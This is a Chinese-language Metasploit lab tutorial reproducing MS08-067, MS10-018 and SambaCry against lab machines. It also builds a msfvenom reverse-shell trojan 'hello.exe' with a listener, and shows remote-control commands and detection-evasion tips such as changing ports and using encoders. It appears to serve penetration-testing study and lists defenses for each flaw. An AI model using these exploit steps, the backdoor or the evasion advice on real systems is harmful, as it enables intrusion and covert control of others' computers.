---
title: MSF的使用以及漏洞复现
date: 2026-07-11 12:00:00
categories:
  - Web安全
  - 渗透测试
tags:
  - MSF
  - 渗透测试
description: MSF渗透测试框架的使用方法、常见漏洞复现（MS08-067、MS10-018、CVE-2017-7494）及msfvenom木马生成
---

# 一、MSF基础概述
1. **定义**  
Metasploit Framework（MSF）是开源全能渗透测试框架，覆盖信息收集、漏洞探测、漏洞利用全流程，内置2000+漏洞模块并持续更新，被称为渗透行业核心工具。
2. **安装目录（Kali默认）**  
`/usr/share/metasploit-framework/`

![](/img/posts/MSF的使用以及漏洞复现/doc_img1.png)

3. **核心目录分工**

| 目录 | 核心作用 |
| --- | --- |
| modules | MSF核心武器库，存放所有渗透模块 |
| data | 字典、Payload模板、资源素材 |
| plugins | 扩展插件，增强联动、扫描能力 |
| scripts | Meterpreter、自动化渗透脚本 |
| tools | 独立编码、漏洞分析小工具 |


4. **modules六大子模块详解**

![](/img/posts/MSF的使用以及漏洞复现/doc_img2.png)

+ `auxiliary`：辅助模块，扫描、嗅探、弱口令爆破、漏洞探测
+ `encoders`：编码器，Payload变形免杀，绕过杀毒/IDS
+ `exploits`：漏洞利用EXP核心库，触发漏洞获取权限
+ `nops`：空指令生成器，稳定溢出攻击内存执行
+ `payloads`：攻击载荷，漏洞触发后执行反弹Shell、Meterpreter
+ `post`：后渗透模块，提权、抓密码、持久化、内网横向移动

# 二、MSF控制台基础命令
| 命令 | 功能 |
| --- | --- |
| `msfconsole` | 启动MSF交互控制台 |
| `?` | 查看全部帮助指令 |
| `search 关键词/CVE` | 检索漏洞、EXP模块 |
| `use 模块路径` | 加载对应漏洞模块 |
| `back` | 退出当前模块，返回主控制台 |
| `show options` | 查看模块必填参数 |
| `set 参数 值` | 配置目标IP、端口、载荷等 |
| `info` | 查看模块漏洞详情、作者、适用系统 |
| `connect ip 端口` | 简易端口连接，类似nc/telnet |
| `jobs` | 查看后台监听、攻击任务 |
| `run / exploit` | 执行漏洞攻击 |
| `sessions` | 查看所有被控主机会话 |
| `sessions -i ID` | 进入指定会话交互 |
| `exit / quit` | 退出会话或MSF控制台 |


1. msfconsole

![](/img/posts/MSF的使用以及漏洞复现/doc_img3.png)

2. ？

![](/img/posts/MSF的使用以及漏洞复现/doc_img4.png)

3. earch

![](/img/posts/MSF的使用以及漏洞复现/doc_img5.png)

4. use

![](/img/posts/MSF的使用以及漏洞复现/doc_img6.png)

5. exit

![](/img/posts/MSF的使用以及漏洞复现/doc_img7.png)

退出 msf

# 三、MSF 渗透测试
## (一) MS08-067
### 1. 简介
**MS08-067** 是Windows XP及部分旧版本Windows系统中著名的**远程代码执行漏洞**（CVE-2008-4250），存在于 **Server服务的RPC请求处理** 中。

攻击者可通过 **SMB（端口445）** 发送特制RPC请求，触发 _NetPathCanonicalize_ 函数的缓冲区溢出，从而在**无需身份验证**的情况下执行任意代码。该漏洞曾被蠕虫病毒 **Conficker** 大规模利用。

### 2. 命令行汇总
```bash
# 1. 静默启动MSF控制台
msfconsole -q
# 2. 检索MS08-067漏洞模块
search ms08-067
# 3. 加载漏洞利用模块
use exploit/windows/smb/ms08_067_netapi
# 4. 查看模块所需配置参数
show options
# 5. 设置受害机IP
set RHOSTS xxxx
# 6. 执行漏洞攻击
run
# 7. 成功进入meterpreter后调出系统cmd命令行
shell
# 8. 返回meterpreter控制台
exit
```



### 3. 攻击步骤
**环境**：WinXP SP3，445端口开放

**前提条件**：已知目标机的 IP 地址 192.168.23.136

![](/img/posts/MSF的使用以及漏洞复现/doc_img8.png)

1. 启动 MSF 框架，准备攻击，执行 msfconsole 命令

```plain
msfconsole -q
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img9.png)

2. 加载漏洞模块，配置攻击参数

```plain
search MS08-067  
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img10.png)

```plain
use 0
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img11.png)

```plain
show options
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img12.png)

设置目标 IP 地址

```plain
set RHOSTS 192.168.23.136 
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img13.png)

3. 执行攻击，获取系统权限。

```plain
run
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img14.png)

```plain
shell
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img15.png)

### 4. 防御
+ 安装KB958644补丁
+ **关闭445端口** 或限制SMB服务对外访问。
+ 部署**防火墙与入侵检测系统**，过滤异常RPC/SMB流量。
+ 定期进行漏洞扫描与系统加固，避免使用已停止支持的操作系统。

## (二) MS10-018 IE浏览器
### 1. 简介
MS10-018是IE浏览器上的漏洞，主要危害Internet Explorer 6和Internet Explorer 7。 

利用方式：MSF搭建恶意网页服务，生成钓鱼URL诱导目标访问，后台监听等待上线

### 2. 命令行汇总
```bash
# 1. 静默启动MSF
msfconsole -q
# 2. 搜索MS10-018 IE漏洞模块
search ms10-018
# 3. 加载IE溢出利用模块
use exploit/windows/browser/ms10_018_ie_behaviors
# 4. 查看模块配置项
show options
# 5. 设置攻击机本机IP（生成钓鱼网页地址）
set SRVHOST xxxx
# 6. 选用正向连接载荷
set PAYLOAD windows/meterpreter/bind_tcp
# 7. 自定义受害机监听端口，规避4444默认特征
set LPORT xxx
# 8. 启动攻击服务
run
# 9. 查看所有被控主机会话
sessions
# 10. 接入ID为1的受害机会话
sessions -i 1
# 11. 调出目标系统cmd命令行
shell
# 12. 切回meterpreter
exit
```

### 3. 攻击步骤
**环境**：WinXP IE6/7

**前提条件**：已知目标机的 IP 地址 192.168.23.136

![](/img/posts/MSF的使用以及漏洞复现/doc_img8.png)

1. 启动 MSF ，准备攻击，执行 msfconsole 命令

```plain
msfconsole -q
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img16.png)

2. 加载漏洞模块

```plain
search MS10-018  
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img17.png)

```plain
use 0
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img18.png)

3. 设置 payload 正向连接 shell

```plain
set PAYLOAD windows/meterpreter/bind_tcp
```

补充：

| Payload 类型 | 名称 | LPORT 含义 | 连接发起方 |
| --- | --- | --- | --- |
| bind_tcp | 正向连接 shell | **靶机监听端口** | 攻击机主动连接靶机 |
| reverse_tcp | 反向反弹 shell | **攻击机监听端口** | 靶机主动外联攻击机 |


bind_tcp 正向 shell 缺点

+ 需要靶机防火墙**允许入站连接**（防火墙开启大概率直接失败）
+ 靶机会新增监听端口，容易被端口扫描发现异常
4. 配置攻击参数，查看要设置哪些东西。

```plain
show options
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img19.png)

查看攻击机的 IP 192.168.23.131

![](/img/posts/MSF的使用以及漏洞复现/doc_img20.png)

设置攻击机的 IP 地址

```plain
set SRVHOST 192.168.23.131 
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img21.png)

修改 bind_tcp 载荷 LPORT，即自定义受害机监听端口

作用：

+ 避免默认 4444 端口被占用导致监听失败
+ 规避知名恶意端口特征，降低流量被安全设备检测发现的概率。  

```plain
set LPORT 9999
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img22.png)

5. 启动攻击服务

```plain
run
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img23.png)

出现的 url 要通过社⼯等⽅法让⽬标机进⾏访问。

这里我们直接让目标机访问这个 url

![](/img/posts/MSF的使用以及漏洞复现/doc_img24.png)

![](/img/posts/MSF的使用以及漏洞复现/doc_img25.png)

回车

6. 查看后台任务与对话

```plain
sessions
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img26.png)

进入这个会话 1（i 就是 in，1 表示会话的 id）

```plain
sessions -i 1
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img27.png)

出现 `meterpreter >` 提示符，**代表漏洞利用成功、已和受害机建立控制通道**，可以对目标进行操作。

7. 执行 shell 启动命令行

```plain
shell
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img28.png)

### 4. 防御
+ 安装KB980182补丁
+ 禁用危险ActiveX
+ 开启DEP/ASLR内存保护。

## (三) CVE-2017-7494 SambaCry（Linux永恒之蓝）
### 1. 简介
CVE-2017-7494，也被称为 Linux 版的永恒之蓝，是一个在 Samba 服务中发现的远程代码执行漏洞。Samba 是一种在 Linux 和 Unix 系统上实现 SMB 协议的自由软件，允许这些系统与 Windows 系统进行文件共享。该漏洞影响了 Samba 版本 3.5.0 到 4.6.4、4.5.10 和 4.4.14 之间的版本。  

漏洞的核心在于 Samba 的 `is_known_pipename () `函数中存在字符过滤问题 ，导致攻击者可以向共享目录传递恶意文件，从而被远程代码执行。  

### 2. 命令行汇总
```bash
# 1. 启动MSF控制台 
msfconsole -q 
# 2. 搜索漏洞模块 
search CVE-2017-7494 
# 3. 加载漏洞利用模块 
use exploit/linux/samba/is_known_pipename 
# 4. 设置目标IP 
set RHOSTS xxxx 
# 5. 执行攻击 
run
```

### 3. 攻击步骤
+ **环境搭建**：Vulhub搭建Samba 3.5~4.6.4
    - 搭建 Vulhub 靶场前提：Ubuntu 宿主机预先安装 git、docker、docker-compose；通过 git 下载 vulhub 源码包；操作时切换 root 权限，进入对应漏洞目录，执行`docker-compose up -d`后台启动漏洞容器。  
    - 部署教程：[https://blog.csdn.net/m0_73909316/article/details/142954056](https://blog.csdn.net/m0_73909316/article/details/142954056)
+ **利用条件**：
    - 服务器共享目录具有访问权限。
    - 要对服务器上写一个文件，并知道其绝对路径。
    - 系统开启了文件/打印机共享端口445。
1. 启动靶机

```bash
# 切换root管理员权限
su root
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img29.png)

提示符变为 `root@ubuntu#` 代表切换成功

```bash
# 进入 vulhub 中Samba漏洞目录（目录内要有docker-compose.yml）
cd /home/enjoy/vulhub-master/samba/CVE-2017-7494
```

```bash
# 后台启动漏洞容器
docker-compose up -d
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img30.png)

注：实验结束，关闭销毁靶场

```bash
# 需要在漏洞对应目录执行
docker-compose down
```

作用：停止并删除容器，释放端口，防止端口冲突

2. 查看靶机的 IP 地址 192.168.23.135

```bash
ifconfig
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img31.png)

3. 启动 MSF

```bash
msfconsole -q
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img32.png)

2. 搜索漏洞模块

```bash
search CVE-2017-7494
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img33.png)

3. 加载SambaCry漏洞的攻击模块

```bash
use 0
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img34.png)

4. 查看当前模块需要配置的参数

```bash
show options
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img35.png)

5. 设置远程受害主机IP

```bash
set RHOSTS 192.168.23.135
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img36.png)

6. 执行攻击

```bash
run
```

7. 启动命令行

```bash
id
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img37.png)

### 4. 防御
+ 升级Samba版本
+ 禁用nt pipe
+ 共享目录设只读
+ 防火墙限制445端口。

## (四) msfvenom 生成后门木马
### Msfvenom 是什么？
Msfvenom是由Msfpayload和Msfencode合并而成的工具，是Metasploit框架的一部分，主要用于生成可执行的有效载荷（payload），支持多种平台和文件格式，并可与Metasploit的其他模块配合进行渗透测试和后渗透操作。

### 2. 使用场景
Msfvenom常用于**红队渗透测试**和**社会工程学攻击**中，通过生成带后门的可执行文件或脚本，诱使目标运行，从而获取控制权 。生成的payload可以直接用于Metasploit框架中建立会话，进行后续的渗透操作和横向移动

### 3. 核心参数
1. -p 指定使用的攻击 payload（后门类型），例如`windows/meterpreter/reverse_tcp`
2. LHOSTLocal Host，攻击机（Kali）IP，受害机主动反弹连接这个地址
3. LPORT 攻击机开启监听的端口
4. -f 文件输出格式（elf、exe、so、raw 等）
5. -o 保存生成的后门文件（output）

### 4. 基础语法
```bash
msfvenom -p 载荷 LHOST=攻击机IP LPORT=监听端口 -f 格式 -o 输出文件
```

### 5. Windows木马示例
1. 查看攻击机的 IP 192.168.23.131

![](/img/posts/MSF的使用以及漏洞复现/doc_img38.png)

2. msfvenom 生成Windows反弹木马

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.23.131 lport=9999 -f exe >hello.exe
```

+ `-p windows/meterpreter/reverse_tcp`：载荷，Windows反弹Meterpreter
+ `LHOST=192.168.23.131`：**攻击机Kali的IP**，靶机主动连接该地址
+ `LPORT=9999`：靶机连接攻击机的端口
+ `-f exe`：输出格式为Windows可执行程序
+ `> hello.exe`：将内容输出保存为hello.exe（等价 `-o hello.exe`）

![](/img/posts/MSF的使用以及漏洞复现/doc_img39.png)

![](/img/posts/MSF的使用以及漏洞复现/doc_img40.png)

3. 监听

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 9999
exploit -j
```

+ `msfconsole`：启动MSF交互式控制台
+ `use exploit/multi/handler`：加载监听模块，等待反弹连接(reverse_tcp）  
+ `set payload`：载荷必须**和木马生成时完全一致**
+ `set LHOST 0.0.0.0`：监听本机所有网卡
+ `set LPORT 9999`：监听端口，必须和木马端口保持统一
+ `exploit -j`：`-j` = job后台运行监听，不会占用当前窗口

![](/img/posts/MSF的使用以及漏洞复现/doc_img41.png)

4. 把木马放到靶机并运行hello.exe，成功得到meterpreter > 后执行

![](/img/posts/MSF的使用以及漏洞复现/doc_img42.png)

5. 查看后台任务与对话

```bash
sessions
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img43.png)

```bash
sessions -i 1
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img44.png)

6. 实现远程控制

```plain
screenshot      # 对受害主机屏幕截图
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img45.png)

```plain
shell           # 调出目标原生cmd命令行
ipconfig
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img46.png)

```plain
run vnc         # 开启VNC远程桌面控制
```

![](/img/posts/MSF的使用以及漏洞复现/doc_img47.png)

